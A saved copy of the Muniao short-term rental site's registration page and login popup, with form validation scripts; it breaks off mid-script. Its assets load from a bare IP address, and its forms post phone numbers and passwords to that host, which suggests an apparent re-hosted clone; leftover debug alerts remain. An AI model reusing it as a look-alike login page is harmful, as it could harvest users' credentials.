<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
<!-- saved from url=(0036)http://user2.muniao.com/Regist/Index -->
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">

    <title>日租房,短租房,特色房,订房网,木鸟短租-注册</title>
    <meta name="keywords" content="日租、日租房、短租、家庭公寓、自助公寓、家庭旅馆、北京日租房、青岛日租房、秦皇岛日租房、大连日租房、石家庄日租房、重庆日租房、天津日租房、广州日租房">
    <meta name="description" content="日租、日租房、短租、家庭公寓、自助公寓、家庭旅馆、北京日租房、青岛日租房、秦皇岛日租房、大连日租房、石家庄日租房、重庆日租房、天津日租房、广州日租房">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=1400, initial-scale=1">
    <!--headermeta-->
    <link rel="stylesheet" href="http://39.105.123.156/images/reset.css" type="text/css">
    <link rel="stylesheet" href="http://39.105.123.156/images/s_style.css" type="text/css">
    <link rel="stylesheet" href="http://39.105.123.156/images/w_css.css" type="text/css">
    <link rel="stylesheet" href="http://39.105.123.156/images/style_single.css" type="text/css">
    <script charset="utf-8" src="http://39.105.123.156/images/v.js.下载"></script><script src="http://39.105.123.156/images/jquery-1.10.2.min.js.下载"></script>
    <script src="http://39.105.123.156/images/muniao.js.下载"></script>
    <script src="http://39.105.123.156/images/base-validator.js.下载"></script>
    <script>
        //解决IE8及以下兼容问题(去空格trim)
        String.prototype.trim = function () {
            return this.replace(/(^\s*)|(\s*$)/g, "");
        }

        function submit() {
            //验证注册类型
            if (getChecked("UserType") == -1) {
                $('#msg_UserType').html('请选择类型&nbsp;&nbsp;&nbsp;X');
                $('#msg_UserType').show();
                return false;
            }
            //验证手机号码
            if ($('#Tel_M').val().trim() == '') {
                $('#msg_Tel_M').html('请输入手机号码&nbsp;&nbsp;&nbsp;X');
                $('#msg_Tel_M').show();
                return false;
            }
            if (!isMobile($('#Tel_M').val().trim())) {
                $('#msg_Tel_M').html('请输入正确的手机号码&nbsp;&nbsp;&nbsp;X');
                $('#msg_Tel_M').show();
                return false;
            }
            //验证电子邮箱
            if ($('#Email').val().trim() != '') {
                if (!isEmail($('#Email').val().trim())) {
                    $('#msg_Email').html('电子邮箱格式错误&nbsp;&nbsp;&nbsp;X');
                    $('#msg_Email').show();
                    return false;
                }
            }
            //验证公寓名称
            if ($('#UserName').val().trim() == '') {
                if (getChecked("UserType") == 0) {
                    $('#msg_UserName').html('真实姓名不能为空&nbsp;&nbsp;&nbsp;X');
                    $('#msg_UserName').show();
                    return false;
                }
                else if (getChecked("UserType") == 1) {
                    $('#msg_UserName').html('公寓名称不能为空&nbsp;&nbsp;&nbsp;X');
                    $('#msg_UserName').show();
                    return false;
                }
            }
            //验证登录密码
            if ($('#Pwd').val().trim() == '') {
                $('#msg_Pwd').html('密码设置为6~18位，仅限输入数字与英文&nbsp;&nbsp;&nbsp;X');
                $('#msg_Pwd').show();
                return false;
            }
            if (!isNumOrEnglish($('#Pwd').val().trim(), 18, 6)) {
                $('#msg_Pwd').html('密码设置为6~18位，仅限输入数字与英文&nbsp;&nbsp;&nbsp;X');
                $('#msg_Pwd').show();
                return false;
            }
            //验证验证注册条款
            if (getChecked('Provision') == -1) {
                alert('您未勾选并同意《服务协议》和《隐私政策》!');
                return false;
            }
            var panduan = getChecked('UserType') == 0 ? 2 : 1

            $('#btn1').hide();
            $.post("Regist/RegistSubmit", {
                userType: getChecked('UserType') == 0 ? 2 : 1,//1房东，2房客
                tel_M: $('#Tel_M').val(),
                email: $('#Email').val(),
                userName: $('#UserName').val(),
                pwd: $('#Pwd').val()
            }, function (data) {
                alert('注册成功！aaaaaaaaaaaaaa');
               // var j = JSON.parse(data);
                if (data.code == 1) {
                    alert('注册成功！');
                    if (panduan == 1) {
                        window.location.href = "https://www.muniao.com";
                    } else {
                        window.location.href = "https://www.muniao.com";
                    }
                }
                else if (data.code == -1) {
                    alert('注册失败！');
                }
                else if (data.code == -2) {
                    alert('您注册的手机号已被占用！');
                }
                else if (data.code == -20) {
                    alert('您注册手机号码格式有误！');
                }
                else if (data.code == -22) {
                    alert('密码设置为6~18位，仅限输入数字与英文！');
                }
                else if (data.code == -23) {
                    alert('密码设置为6~18位，仅限输入数字与英文！');
                }
            });
        }
        function goback() {
            history.go(-1);
            self.location = document.referrer;
        }
        //得到选中项
        function getChecked(name) {
            var chk = -1;
            var chkObjs = document.getElementsByName(name);
            for (var i = 0; i < chkObjs.length; i++) {
                if (chkObjs[i].checked) {
                    chk = i;
                    break;
                }
            }
            return chk;
        }

        //设置用户类型样式文字描述
        function setUserTypeMsg(tp) {
            if (tp == 1) {
                $('#msg_UserType').hide(); $('#usertype_name').html('真实姓名：'); $('#UserName').attr('placeholder', '请输入您的真实姓名');
            }
            else {
                $('#msg_UserType').hide(); $('#usertype_name').html('公寓名称：'); $('#UserName').attr('placeholder', '请输入您的公寓名称');
            }
        }

    </script>
    <style>
        .s_mn_registered_banner {
            width: 100%;
            background: url('http://39.105.123.156/images/register_banner.jpg') 50% no-repeat;
        }

        .w_rfont {
            font: 14px/40px "Microsoft YaHei";
        }

        .w_rradio {
            margin-top: 15px;
            float: left;
            cursor: pointer;
        }

        .w_rfgray {
            color: #555;
            width: auto;
            height: auto;
            text-align: left;
            cursor: pointer;
        }

        input::-ms-reveal {
            display: none;
        }
        /*隐藏密码框小眼睛*/
    </style>
</head>
<body style="">

<style>
    .w_user_xl{width:160px; position:absolute; right:0; top:32px; z-index:199;background-color: #fff;box-shadow: 1px 2px 4px 2px #666;text-align: left;}
    .w_user_xlfd{ width:130px; margin:0 auto; padding:20px 0;}
    .w_user_xl .w_user_font{ font:12px/25px "microsoft yahei"; color:#333;}
    .w_user_xl .w_user_tt{ width:120px; padding-left:10px; font-size:14px; font-weight:bold; border-bottom:1px solid #ccc;}
    .w_user_xl .w_user_list{ width:100%; height:auto; margin-top:5px; }
    .w_user_xl .w_user_list li{ width:50%; text-align:center; float:left; padding:0;}
    .w_user_xl .w_user_list li a{ color:#333;}
    .w_user_xl .w_user_list li:hover{ background:#ff3300;}
    .w_user_tc{ width:130px; margin:20px auto 0; border-top:1px dashed #ccc; font-weight:bold;text-align:center;}
    .w_user_tc a:hover{ color:#ff3300; text-decoration:underline;}
    .w_user_t22{ top:22px;}
    .free-publishBtn{display:inline-block;padding:0 16px;background:#ff9180;color:#ffffff;-webkit-border-radius:6px;height: 39px;line-height: 39px;margin: 3px 6px 0 0;}
</style>
<script>
    function logout() {
        $.get("/Login/OutLogin", function (data) {
            //var j = JSON.parse(data);
            if (data == "1") {
                location.href = 'http://www.muniao.com';
            }
        });
    }
</script>
<!--[if lte IE 7]>
<div style="background:#ff6180;  width:100%; height:50px; line-height:50px; text-align:center; font-size:14px; color:#fff; font-family:"微软雅黑";>
    温馨提示：您目前的浏览器版本过低，网站部分功能无法正常使用，建议尽快升级：
        <a href="http://www.chromeliulanqi.com/" target="_blank" name="升级谷歌浏览器" id="upgrade_firefox" style="display:inline-block;  vertical-align:middle;  margin:0 18px 0 12px;_margin-top:4px;_margin-bottom:4px;"><img src="/Content/images/google_Icon.jpg"/></a>
        <a href="http://www.firefox.com.cn" target="_blank" name="升级火狐浏览器" id="upgrade_firefox" style="display:inline-block;  vertical-align:middle;  margin:0 18px 0 12px;_margin-top:4px;_margin-bottom:4px;"><img src="/Content/images/firefox_Icon.jpg"/></a>
</div>
<![endif]-->
<div class="s_mn_headbox" id="s_mn_headbox">
    <h2 class="s_mn_logo w_mL30" style="margin-left:30px;"> <a href="http://www.muniao.com/"><img src="http://39.105.123.156/images/mn_logo.png" width="80" height="40"></a> </h2>
    <div class="w_slogan" style="display:block;"><img src="http://39.105.123.156/images/slogan_2015.png" alt="一间房一种生活" title="一间房一种生活"></div>
    <ul class="s_mn_nav">
        <li><a href="http://www.muniao.com/">首页</a></li>
        <li style="display:none;"><a href="http://international.muniao.com/" target="_self">海外短租</a></li>
        <li><a href="http://www.muniao.com/features.html" target="_self">特色短租</a></li>
        <li><a href="http://www.muniao.com/list_story_0_1.html" target="_self">发现</a></li>
        <li><a href="http://www.muniao.com/mobile.html" target="_blank">手机木鸟<i class="give"><img src="http://39.105.123.156/images/give88.png"></i></a></li>
    </ul>
    <div id="div_Login" class="s_mn_loginbox w_mR30" style="">

        <div class="s_mn_login">
            <a href="javascript:void(0);" id="Login" class="s_mn_loginbutt" rel="nofollow">登录</a>·
            <a href="http://user2.muniao.com/Regist/Index" class="s_mn_loginbutt" rel="nofollow">注册</a>
        </div>
    </div>



</div>
<!--登录弹出框-->







<title></title>
<script src="http://39.105.123.156/images/base-validator.js.下载"></script>
<style>
    .newa_login_bg {
        display: none;
        position: fixed;
        width: 100%;
        height: 100%;
        top: 0;
        left: 0;
        background: #000;
        opacity: 0.36;
        filter: alpha(opacity=36);
        z-index: 100;
    }

    .newa_login_main {
        z-index: 9999;
        visibility: hidden;
        opacity: 0;
        -webkit-transition: .2s cubic-bezier(0, 0.56, 0.14, 1.33);
        -moz-transition: .2s cubic-bezier(0, 0.56, 0.14, 1.33);
        -ms-transition: .2s cubic-bezier(0, 0.56, 0.14, 1.33);
        -o-transition: .2s cubic-bezier(0, 0.56, 0.14, 1.33);
        transition: .2s cubic-bezier(0, 0.56, 0.14, 1.33);
        -webkit-transform: scaleY(0.5) scaleX(0.5);
        -moz-transform: scaleY(0.5) scaleX(0.5);
    ;
        -ms-transform: scaleY(0.5) scaleX(0.5);
    ;
        -o-transform: scaleY(0.5) scaleX(0.5);
    ;
        transform: scaleY(0.5) scaleX(0.5);
    ;
        font-size: 14px;
        position: fixed;
        background: #fff;
        width: 280px;
        padding: 0 50px 16px;
        top: 50%;
        left: 50%;
        margin-left: -190px;
        margin-top: -219px;
        border-radius: 3px;
        box-shadow: 0 0 8px 1px rgba(0,0,0,.24);
    }

    .newa_login_pop {
        visibility: visible;
        opacity: 1;
        -webkit-transform: scaleY(1) scaleX(1);
        -moz-transform: scaleY(1) scaleX(1);
        -ms-transform: scaleY(1) scaleX(1);
        -o-transform: scaleY(1) scaleX(1);
        transform: scaleY(1) scaleX(1);
    }

    .newa_close {
        display: block;
        width: 12px;
        height: 12px;
        background: url("http://39.105.123.156/images/newa_close.png") no-repeat;
        position: absolute;
        top: 16px;
        right: 16px;
    }

    .newa_login_tab {
        width: 220px;
        margin: 29px auto 37px;
        height: 32px;
    }

    .newa_login_tab li {
        line-height: 30px;
        width: 110px;
        float: left;
        font-size: 18px;
        color: #777;
        text-align: center;
        cursor: pointer;
    }

    .newa_login_t_active span {
        display: inline-block;
        width: 73px;
        border-bottom: 2px solid #ff9180;
    }

    .newa_login_con {
        display: none;
        width: 280px;
    }

    .newa_login_input li {
        position: relative;
        margin-bottom: 18px;
    }

    .newa_login_input input {
        width: 245px;
        height: 40px;
        font-size: 14px;
        padding-left: 35px;
        border: 1px solid #eeeeee;
    }

    .newa_login_input li i {
        position: absolute;
        display: inline-block;
        width: 13px;
        height: 17px;
        top: 14px;
        left: 9px;
    }

    .newa_email_tel_icon {
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat 0 -53px;
    }

    .newa_l_password_icon {
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat -18px -53px;
    }

    .newa_login_input li i.newa_kj_icon {
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat 0 -74px;
        width: 14px;
        height: 18px;
    }

    .newa_login_input li i.newa_piccode_icon {
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat 0 -97px;
        top: 15px;
        width: 17px;
        height: 14px;
    }

    .newa_login_input li i.newa_code_icon {
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat 0 -116px;
        top: 15px;
        width: 16px;
        height: 14px;
    }

    .newa_foget {
        height: 14px;
        line-height: 14px;
        margin-bottom: 28px;
    }

    .newa_foget label {
        color: #999999;
        font-size: 14px;
    }

    .newa_foget_m {
        float: right;
        color: #ff9180;
        font-size: 14px;
    }

    .newa_login_btn {
        display: block;
        width: 310px;
        height: 70px;
        background: url("http://39.105.123.156/images/login_btn.png")no-repeat;
        margin-left: -15px;
    }

    .newa_login_btn:hover {
        background: url("http://39.105.123.156/images/login_btn.png")no-repeat -310px 0;
    }

    .newa_zc {
        color: #999;
        margin-top: -6px;
    }

    .newa_zc a {
        color: #fe7e71;
    }

    .newa_zc a:hover {
        text-decoration: underline;
    }

    .newa_coop {
        margin-top: 28px;
    }

    .newa_coop a {
        display: inline-block;
    }

    .newa_coop .newa_sina {
        width: 28px;
        height: 23px;
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat 0 -25px;
    }

    .newa_coop .newa_qq {
        width: 18px;
        height: 20px;
        background: url("http://39.105.123.156/images/login_icon.png") no-repeat -1px 0;
        margin-left: 25px;
    }

    .newa_piccode {
        display: block;
        width: 80px;
        height: 36px;
        position: absolute;
        right: 0px;
        top: 2px;
    }

    .newa_code {
        display: block;
        height: 40px;
        line-height: 44px;
        color: #fe7e71;
        padding: 0 10px;
        position: absolute;
        right: 0px;
        top: 0;
    }

    .newa_tips {
        visibility: hidden;
        border: 1px solid #ccc;
        background: #fff;
        opacity: 0;
        -webkit-transform: translateY(10px);
        -moz-transform: translateY(10px);
        -ms-transform: translateY(10px);
        -o-transform: translateY(10px);
        transform: translateY(10px);
        -webkit-transition: transform .1s ease-in;
        -moz-transition: transform .1s ease-in;
        -ms-transition: transform .1s ease-in;
        -o-transition: transform .1s ease-in;
        transition: transform .1s ease-in;
        -webkit-box-shadow: 0 4px 20px 1px rgba(0, 0, 0, 0.2);
        -moz-box-shadow: 0 4px 20px 1px rgba(0, 0, 0, 0.2);
        box-shadow: 0 4px 20px 1px rgba(0, 0, 0, 0.2);
        line-height: 20px;
        padding: 4px 14px;
        display: inline-block;
        font-size: 12px;
        color: #999999;
        position: absolute;
        left: 50%;
        top: 58px;
        -webkit-border-radius: 3px;
        -moz-border-radius: 3px;
        border-radius: 3px;
    }

    .newa_tips .newa_tips_icon {
        margin-right: 10px;
        font-style: normal;
        display: inline-block;
        width: 14px;
        height: 14px;
        font-size: 12px;
        background: #fe7e71;
        color: #fff;
        text-align: center;
        line-height: 14px;
        -webkit-border-radius: 7px;
        -moz-border-radius: 7px;
        border-radius: 7px;
    }

    .newa_trans {
        -webkit-transition: .1s ease-in;
        -moz-transition: .1s ease-in;
        -ms-transition: .1s ease-in;
        -o-transition: .1s ease-in;
        transition: .1s ease-in;
    }

    .newa_tips_show {
        -webkit-transform: translateY(0);
        -moz-transform: translateY(0);
        -ms-transform: translateY(0);
        -o-transform: translateY(0);
        transform: translateY(0);
        visibility: visible;
        opacity: 1;
    }

    .newa_close_tips {
        margin-left: 14px;
        font-size: 16px;
        line-height: 16px;
    }

    .newa_close_tips:hover {
        color: #fe7e71;
    }

    .newa_triangle {
        position: absolute;
        bottom: -15px;
        left: 50%;
        margin-left: -7px;
        right: auto;
        height: 14px;
        display: inline-block;
        font-size: 0;
    }

    .newa_triangle i, .newa_triangle em {
        overflow: hidden;
        vertical-align: top;
        width: 0;
        height: 0;
        overflow: hidden;
        font-size: 0;
        line-height: 0;
        border: 7px solid;
        display: inline-block;
    }

    .newa_triangle i {
        border-color: #ccc transparent transparent transparent;
    }

    .newa_triangle em {
        border-color: #fff transparent transparent transparent;
        margin: -1px 0 0 -14px;
    }

    .newa_piccode img {
        width: 80px;
        height: 36px;
    }
</style>

<script>
    function toLogin(tp) {
        if (tp == 0) {
            //手机号为空验证
            if ($('#login_Tel_M').val().trim() == '') {
                $('#login_Tel_M').focus();
                $('.newa_tips_text').html('请输入手机号码');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
                return false;
            }
            //手机号是否正确
            if (!isMobile($('#login_Tel_M').val().trim())) {
                $('#login_Tel_M').focus();
                $('.newa_tips_text').html('手机号格式错误');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
                return false;
            }
            //验证图形验证码空判断
            if ($('#login_ValidCode').val().trim() == '') {
                $('#login_ValidCode').focus();
                $('.newa_tips_text').html('请输入图形验证码');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 126 }).addClass("newa_tips_show");
                return false;
            }
            //验证短信验证码空判断
            if ($('#login_MsgCode').val().trim() == '') {
                $('#login_MsgCode').focus();
                $('.newa_tips_text').html('请输入短信验证码');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                return false;
            }
            //登录
            $.post("login/CheckLoginFast", {
                Tel_M: $('#login_Tel_M').val().trim(),
                ValidCode: $('#login_ValidCode').val().trim(),
                MsgCode: $('#login_MsgCode').val().trim()
            }, function (data) {
             //   var j = JSON.parse(data);
                if (data.code == -1) {//图形验证码错误
                    getImageCode($("#ValidImg"));
                    $('#login_ValidCode').focus();
                    $('.newa_tips_text').html('图形验证码错误');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 126 }).addClass("newa_tips_show");
                    return false;
                }
                else if (data.code == -2) {//短信验证码错误
                    $('#login_MsgCode').focus();
                    $('.newa_tips_text').html('短信验证码错误');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                    return false;
                } else if (data.code ==-22) {
                    $('#login_MsgCode').focus();
                    $('.newa_tips_text').html('验证码已经失效，请重新获取验证码！');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                    return false;
                }
                else if (data.code == 1) {
                    location.href = 'http://www.muniao.com';
                }
                else if (data.code == 3) {
                    alert(j.mgs);
                }
            });

        }
        else {
            //手机号为空验证
            if ($('#Login_Email_Tel_M').val().trim() == '') {
                $('#Login_Email_Tel_M').focus();
                $('.newa_tips_text').html('请输入手机号码');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
                return false;
            }
            //手机号是否正确
            if (!isMobile($('#Login_Email_Tel_M').val().trim())) {
                $('#Login_Email_Tel_M').focus();
                $('.newa_tips_text').html('手机号格式错误');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
                return false;
            }
            //密码为空验证
            if ($('#Login_Pwd').val().trim() == '') {
                $('#Login_Pwd').focus();
                $('.newa_tips_text').html('请输入密码');
                $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 126 }).addClass("newa_tips_show");
                return false;
            }
            //普通登录
            $.post("login/checkLogin", {
                tel: $('#Login_Email_Tel_M').val().trim(),
                password: $('#Login_Pwd').val().trim()
            }, function (data) {
               // var j = JSON.parse(data);
                alert("1111111111111111")
                if (data.code == 1) {
                    location.href = 'http://www.muniao.com';
                }
                else if (data.code == -1) {
                    $('#Login_Email_Tel_M').focus();
                    $('.newa_tips_text').html('您还不是木鸟用户，请注册!');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                    return false;
                }
                else if (data.code == -2) {
                    $('#Login_Email_Tel_M').focus();
                    $('.newa_tips_text').html('账号已锁定');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                    return false;
                }
                else if (data.code == -3) {
                    $('#Login_Pwd').focus();
                    $('.newa_tips_text').html('登录密码错误');
                    $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 186 }).addClass("newa_tips_show");
                    return false;
                }
                else {
                    alert('登录失败');
                }
            });
        }
    }

    //获取短信验证码
    var Login_IsOut = false;//验证码是否过期
    function getLoginValidCode(obj) {
        //手机号为空验证
        if ($('#login_Tel_M').val().trim() == '') {
            $('#login_Tel_M').focus();
            $('.newa_tips_text').html('请输入手机号码');
            $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
            return false;
        }
        //手机号是否正确
        if (!isMobile($('#login_Tel_M').val().trim())) {
            $('#login_Tel_M').focus();
            $('.newa_tips_text').html('手机号格式错误');
            $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 66 }).addClass("newa_tips_show");
            return false;
        }
        //验证图形验证码空判断
        if ($('#login_ValidCode').val().trim() == '') {
            $('#login_ValidCode').focus();
            $('.newa_tips_text').html('请输入图形验证码');
            $(".newa_tips").css({ "margin-left": -(newa_len * 12 + 82) / 2, "top": 126 }).addClass("newa_tips_show");
            return false;
        }
        /*发送短信*/
        $.ajaxSettings.async = false;
        $.ajaxSetup({ cache: false });
        $.get('login/getCode', { tel: $('#login_Tel_M').val(), ValidCode: $('#login_ValidCode').val().trim() }, function (data) {
            var State = JSON.parse(data).State;
            if (State == 1) {
                //$('#hd_MsgCode').val(JSON.parse(data).UtilsCode);

                /*设置样式*/
                var name = $(obj).html();
                var color = $(obj).css('color');
                var i = 60;
                $(obj).html(i + '秒');
                $(obj).css('color', '#fe7e71');
                $(obj).removeAttr("onclick");
                var inv = setInterval(function () {
                    if (i == 1) {
                        $(obj).html(name);
                        $(obj).css('color', color);
                        $(obj).attr("onclick", "getLoginValidCode(this)");
                        clearInterval(inv);
                    }
                    else {
                        i--;
                        $(obj).html(i + '秒');
                    }
                }, 1000);
                /*设置验证码过期时间*/
                var outtime = setInterval(function () {
                    Login_IsOut = true;
                    clearInterval(outtime);
                }, 120000);
                /*验真手机号*/
                $('#hd_ValidTel').val($('#edit_Tel').val());
                alert('短信验证码已发送，请注意查收！');
            }
            else if (State == 2) {
                alert('已达到验证次数上限，请稍后再试！');
            }
            else if (State == 4) {
                alert('您还不是木鸟用户，请注册！');
            } else if (State == 5) {
                alert('图形验证码错误！');
            }
            else {
                alert('发送失败，请稍后重试！');
            }

        })
    }
    //获取图片验证码
    function getImageCode()
    {
        document.getElementById("ValidImg").src = "login/pic?random=" + Math.random();
    }
</script>
<style>
    input::-ms-reveal {
        display: none;
    }
    /*隐藏密码框小眼睛*/
</style>


<div class="newa_login_bg" style="display: none;"></div>
<div class="newa_login_main">
    <a href="javascript:;" class="newa_close"></a>
    <ul class="newa_login_tab">
        <li class="newa_login_t_active"><span>快捷登录</span></li>
        <li><span>普通登录</span></li>
    </ul>
    <!--快捷登录--->
    <div class="newa_login_con" style="display: block">
        <ul class="newa_login_input">
            <li>
                <i class="newa_kj_icon"></i>
                <input type="text" id="login_Tel_M" name="newa_kj_phone" placeholder="手机号">
            </li>
            <li>
                <i class="newa_piccode_icon"></i>
                <input type="text" id="login_ValidCode" name="newa_piccode" placeholder="图形验证码">
                <input type="hidden" id="hd_ValidCode">

                <a class="newa_piccode" href="javascript:void(0);"><img id="ValidImg" src="http://39.105.123.156/images/VerifyCode" onclick="getImageCode();"></a>
            </li>
            <li>
                <i class="newa_code_icon"></i>
                <input type="text" id="login_MsgCode" name="newa_code" placeholder="短信验证码">
                <input type="hidden" id="hd_MsgCode">
                <span class="newa_code" style="cursor:pointer;" onclick="getLoginValidCode(this);">获取短信验证码</span>
            </li>
        </ul>
        <div class="newa_foget">
            <a class="newa_foget_m" href="http://user2.muniao.com/forgetpass">忘记密码？</a>
        </div>
        <a class="newa_login_btn newa_quick" href="javascript:;" onclick="toLogin(0)"></a>
        <p class="newa_zc">还没有木鸟账号？<a href="http://user2.muniao.com/regist">立即注册</a> </p>
        <div class="newa_coop">
            <a class="newa_sina" href="https://api.weibo.com/oauth2/authorize?state=http%3A%2F%2Fwww.muniao.com%2Fuser%2Fcenter&amp;client_id=3437054643&amp;response_type=code&amp;redirect_uri=http%3A%2F%2Fwww.muniao.com%2FHome%2FCallBack%3Fchannel%3Dweibo"></a>
            <a class="newa_qq" href="https://graph.qq.com/oauth2.0/authorize?state=Login&amp;client_id=101214959&amp;response_type=code&amp;redirect_uri=http://www.muniao.com/home/callback?channel=qq&amp;fromurl=http%3A%2F%2Fwww.muniao.com%2Fuser%2Fcenter&amp;scope=get_user_info,get_fanslist,get_idollist,add_idol"></a>
        </div>
    </div>
    <!---普通登录---->
    <div class="newa_login_con">
        <ul class="newa_login_input">
            <li>
                <i class="newa_email_tel_icon"></i>
                <input type="text" id="Login_Email_Tel_M" placeholder="邮箱/手机号">
            </li>
            <li>
                <i class="newa_l_password_icon"></i>
                <input type="password" id="Login_Pwd" placeholder="密码">
            </li>
        </ul>
        <div class="newa_foget">
            <a class="newa_foget_m" href="http://user2.muniao.com/forgetpass">忘记密码？</a>
            <input id="newa_auto_l" type="checkbox">
            <label for="newa_auto_l">下次自动登录</label>
        </div>
        <a class="newa_login_btn newa_ordinary" href="javascript:void(0);" onclick="toLogin(1)"></a>
        <p class="newa_zc">还没有木鸟账号？<a href="http://user2.muniao.com/regist">立即注册</a> </p>
        <div class="newa_coop">
            <a class="newa_sina" href="http://user2.muniao.com/Regist/Index#"></a>
            <a class="newa_qq" href="http://user2.muniao.com/Regist/Index#"></a>
        </div>
    </div>
    <!---tips--->
    <div class="newa_tips newa_tips_kj">
        <i class="newa_tips_icon">!</i>
        <span class="newa_tips_text">请输入</span>
        <a class="newa_close_tips" href="javascript:;">×</a>
        <span class="newa_triangle"><i></i><em></em></span>
    </div>
</div>
<script>
    $(".newa_login_tab li").each(function (a, b) {
        $(b).on("click", function () {
            $(this).addClass("newa_login_t_active").siblings().removeClass("newa_login_t_active");
            $(".newa_login_con").eq(a).show().siblings(".newa_login_con").hide();
        })
    })
    $("#Login").click(function () {
        $(".newa_login_bg").show();
        $(".newa_login_main").addClass("newa_login_pop");
    })
    $(".newa_close").click(function () {
        $(".newa_login_bg").hide();
        $(".newa_login_main").removeClass("newa_login_pop");
    })
    var kj_phone = $("input[name='newa_kj_phone']");
    var newa_tips = $(".newa_tips");
    var newa_len = $(".newa_tips_text").text().length;
    //$(".newa_quick").click(function () {
    //    if (kj_phone.val() == "") {
    //        kj_phone.focus();
    //        newa_tips.css({ "margin-left": -(newa_len * 12 + 82) / 2 }).addClass("newa_tips_show");
    //    }
    //})
    //$(".newa_close_tips,.newa_login_input li").click(function () {
    //    newa_tips.addClass("newa_trans");
    //    newa_tips.removeClass("newa_tips_show");
    //})
</script>



<div class="s_mn_mainbox" id="s_mn_mainbox">
    <div class="s_mn_registered_banner" id="s_mn_registered_banner">
        <div class="s_mn_center2">
            <div class="s_mn_registeredbox">
                <div style="display:none;">
                    <input type="hidden" name="returnurl" value="http://www.muniao.com/mobile.html">
                    <input name="usertype" id="usertype" value="">
                </div>
                <div class="s_mn_registered_main" style="background:url(&#39;http://39.105.123.156/images/search_indexbg.png&#39;)">
                    <div class="s_mn_reg_ipt w_rfont">
                        <div class="s_mn_account_error" id="msg_UserType" style="display:none;">请选择类型&nbsp;&nbsp;&nbsp;X</div>
                        <label>注册类型：</label>
                        <input id="UserType2" name="UserType" class="w_rradio" type="radio" value="2" onclick="setUserTypeMsg(1)"><label onclick="setUserTypeMsg(1)" class="w_rfgray" for="UserType2" style="text-align:left;">房客注册</label>
                        <input id="UserType1" name="UserType" class="w_rradio" type="radio" value="1" onclick="setUserTypeMsg(2)"><label onclick="setUserTypeMsg(2)" class="w_rfgray" for="UserType1" style="text-align:left;">房东注册</label>
                    </div>
                    <div class="s_mn_reg_ipt">
                        <div class="s_mn_account_error" id="msg_Tel_M" style="display:none;">请输入正确的手机号码&nbsp;&nbsp;&nbsp;X</div>
                        <label>手机号码：</label>
                        <input id="Tel_M" type="tel" class="s_mn_registered_input" onclick="$(&#39;#msg_Tel_M&#39;).hide();" value="" placeholder="请输入您的手机号码" autocomplete="off">
                    </div>
                    <div class="s_mn_reg_ipt">
                        <div class="s_mn_account_error" id="msg_Email" style="display:none;">请输入正确的电子邮件&nbsp;&nbsp;&nbsp;X</div>
                        <label>电子邮箱：</label>
                        <input id="Email" type="email" class="s_mn_registered_input" onclick="$(&#39;#msg_Email&#39;).hide();" value="" placeholder="请输入您的电子邮箱" autocomplete="off">
                    </div>
                    <div class="s_mn_reg_ipt">
                        <div class="s_mn_account_error" id="msg_UserName" style="display:none;">姓名仅为不能为空&nbsp;&nbsp;&nbsp;X</div>
                        <label id="usertype_name">公寓名称：</label>
                        <input id="UserName" type="text" class="s_mn_registered_input" onclick="$(&#39;#msg_UserName&#39;).hide();" value="" placeholder="请输入您的公寓名称" autocomplete="off">
                    </div>
                    <div class="s_mn_reg_ipt">
                        <div class="s_mn_account_error" id="msg_Pwd" style="display:none;">密码设置为6~18位，仅限输入数字与英文&nbsp;&nbsp;&nbsp;X</div>
                        <label>登录密码：</label>
                        <input id="Pwd" type="password" class="s_mn_registered_input" onclick="$(&#39;#msg_Pwd&#39;).hide();" value="" placeholder="请设定您的密码" autocomplete="off">
                    </div>
                    <p><input type="checkbox" id="Provision" name="Provision" value="1" class="s_mn_check" checked="checked">我已阅读并同意<a style="color:#ffd800" href="http://www.muniao.com/Help/ServiceAgreement" target="_blank">《服务协议》</a>和<a style="color:#ffd800" target="_blank" href="http://www.muniao.com/Help/PrivacyPolicy">《隐私政策》</a></p>
                    <div class="s_mn_reg_submit">
                        <input id="btn1" type="button" class="s_mn_button6" onmouseover="this.className=&#39;s_mn_button6_hover&#39;" onclick="submit()" onmouseout="this.className=&#39;s_mn_button6&#39;" value="免 费 注 册">
                    </div>
                </div>
                <div class="s_mn_reg_login">
                    <p>已有木鸟短租账号？请<a href="javascript:void(0);" onclick="$(&#39;.newa_login_main&#39;).attr(&#39;class&#39;,&#39;newa_login_main newa_login_pop&#39;)">点此直接登录</a></p>
                </div>
            </div>
        </div>
    </div>
</div>
<div style="display:none;">
    <script>
